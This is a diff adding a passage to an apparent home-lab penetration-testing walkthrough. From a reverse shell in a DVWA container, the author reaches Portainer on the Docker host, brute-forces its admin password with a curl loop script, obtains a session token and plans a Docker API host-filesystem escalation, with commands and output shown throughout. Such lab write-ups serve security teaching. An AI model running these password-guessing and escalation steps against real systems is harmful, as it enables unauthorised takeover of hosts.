@@ -648,3 +648,110 @@ www-data      53  0.0  0.1   6392  3672 ?        R    19:16   0:00 ps aux
 ```
 
 </details>
+
+No unusual mounts — standard container filesystem, nothing host-level bind-mounted in. Process list is also unremarkable (just Apache workers and our shell). Container breakout doesn’t look viable through this path either.
+
+curl is available though, which matters — let’s use it to probe other services on the Docker host itself (vuln-docker-01, 10.0.40.10), since this container might have outbound network reach beyond its own Docker bridge:
+
+```
+curl -sk https://10.0.40.10:9443/api/status
+```
+
+<details> <summary>Command explained</summary>
+  
+| Part | What it does |
+|---|---|
+| `curl -sk` |	Makes an HTTPS request silently (-s), ignoring certificate warnings (-k) since this is a self-signed cert |
+| `https://10.0.40.10:9443/api/status` |	Portainer’s unauthenticated status endpoint — if reachable, confirms Portainer (which manages Docker directly) is accessible from inside this container, which would be a real path toward host-level compromise if Portainer’s own credentials are weak or default |
+
+</details>
+
+<details> <summary>Click to view full output</summary>
+
+```
+www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ curl -sk https://10.0.40.10:9443/api/status
+<s/exec$ curl -sk https://10.0.40.10:9443/api/status
+{"Version":"2.45.2","InstanceID":"203c64a0-e565-4825-badc-f5b3f4881d8d"}www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$
+```
+
+</details>
+
+Real finding — Portainer is reachable from inside this container at the host’s actual VULNERABLE VLAN IP, not just the internal Docker bridge. That’s meaningful: it means outbound network reach from this container extends beyond its own bridge network. Portainer manages Docker directly, so if we can authenticate to it, that’s a realistic path to full control of the vuln-docker-01 host itself.
+
+Let’s test credential reuse first — worth checking since that’s already the theme of this scenario — before resorting to a deliberate misconfiguration:
+
+```
+curl -sk -X POST https://10.0.40.10:9443/api/auth -H "Content-Type: application/json" -d '{"Username":"admin","Password":"p@ssw0rd"}'
+```
+
+<details> <summary>Command explained</summary>
+  
+| Part | What it does |
+|---|---|
+| `-X POST ... -H "Content-Type: application/json" -d '...'` |	Sends a login request to Portainer’s authentication API |
+| `{"Username":"admin","Password":"p@ssw0rd"}` |	Tests whether the DVWA database password was reused as the Portainer admin password — a realistic credential-reuse scenario |
+
+</details>
+
+<details> <summary>Click to view full output</summary>
+
+```
+{"Version":"2.45.2","InstanceID":"203c64a0-e565-4825-badc-f5b3f4881d8d"}www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ curl -sk -X POST https://10.0.40.10:9443/api/auth -H "Content-Type: application/json" -d '{"Username":"admin","Password":"p@ssw0rd"}'
+<on" -d '{"Username":"admin","Password":"p@ssw0rd"}'
+{"message":"Invalid credentials","details":"Unauthorized"}www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$
+```
+
+</details>
+
+Credential reuse failed — Portainer’s admin password is different from the DVWA database password. That’s actually a legitimate, good finding in its own right: it shows password reuse didn’t happen here, meaning this particular lateral movement attempt was stopped by decent credential hygiene on the Portainer side.
+
+Attempting common passwords now:
+
+```
+cat << 'EOF' > /tmp/brute.sh
+for pass in "Portainer1!" "admin" "password" "Password1" "Portainer123" "Welcome1!" "Changeme1!" "P@ssw0rd" "Portainer1!$" "Summer2024!" "Welcome123!"; do
+  result=$(curl -sk -X POST https://10.0.40.10:9443/api/auth -H "Content-Type: application/json" -d "{\"Username\":\"admin\",\"Password\":\"$pass\"}")
+  echo "Trying: $pass -> $result"
+done
+EOF
+```
+
+```
+Runs the saved script as a separate, clean execution, rather than typing a complex multi-line command directly into the fragile reverse shell prompt
+```
+
+<details> <summary>Command explained</summary>
+  
+| Part | What it does |
+|---|---|
+| `cat << 'EOF' > /tmp/brute.sh ... EOF` |	Writes the script to a file using a quoted heredoc delimiter ('EOF'), which tells bash not to expand anything while writing — avoids the quoting/history-expansion issues that broke earlier inline attempts with special characters like ! and $ |
+| `bash /tmp/brute.sh` |	Runs the saved script as a separate, clean execution, rather than typing a complex multi-line command directly into the fragile reverse shell prompt |
+
+</details>
+
+<details> <summary>Click to view full output</summary>
+
+```
+bash /tmp/brute.sh
+Trying: Portainer1! -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: admin -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: password -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: Password1 -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: Portainer123 -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: Welcome1! -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: Changeme1! -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: P@ssw0rd -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: Portainer1!$ -> {"jwt":"HASH SHOWN BUT REDACTED"}
+Trying: Summer2024! -> {"message":"Invalid credentials","details":"Unauthorized"}
+Trying: Welcome123! -> {"message":"Access denied","details":"Access denied to resource"}
+```
+
+</details>
+
+Now we have a valid session. Portainer manages Docker directly, so the next step is using this token to create a new container with the host’s root filesystem mounted in — a classic Docker API privilege escalation technique that gives full read/write access to the underlying host (vuln-docker-01) from inside a container.
+
+First, let’s find the environment ID Portainer is managing:
+
+```
+echo 'curl -sk https://10.0.40.10:9443/api/endpoints -H "Authorization: Bearer PASTE_JWT_HERE"' > /tmp/endpoints.sh
+```
